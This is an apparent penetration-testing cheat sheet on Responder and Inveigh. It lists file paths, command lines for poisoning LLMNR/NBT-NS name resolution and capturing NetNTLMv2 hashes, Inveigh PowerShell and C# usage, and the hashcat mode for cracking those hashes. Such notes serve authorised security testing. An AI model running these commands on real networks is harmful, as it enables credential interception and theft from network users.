# Responder and Inveigh

## Responder Data Files
- Data is stored in /usr/share/responder/logs
- Defautl database is /usr/share/responder/Responder.db (sqlite DB)
- Default configuration file is /usr/share/responder/Responder.conf
- If relaying with nltmx make sure to disable smb in Responder.conf ^^
- Hashcat mode for NetNTLMv2 is 5600

## Responder Usage
```
## Analyze Mode
responder -I eth0 -A 

## Active Intercept
responder -I eth0 -Pwd
```

## Legacy versions of Responder
```
responder -I eth0 -wrf
```

## Inveigh Usage (Legacy version)
```
## Import Module
. .\Inveigh.ps1
Import-Module .\Inveigh.ps1

## Get All Command Parameters
(Get-Command Invoke-Inveigh).Parameters

## Default Usage
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

## Stop Inveigh
Stop-Inveigh
```

## Inveigh-Zero (C# version)
```
.\Inveigh.exe

## Check Hashes
Press the ESC button and type HELP for all options
GET NTLMV2UNIQUE
RESUME to resume intercepting
```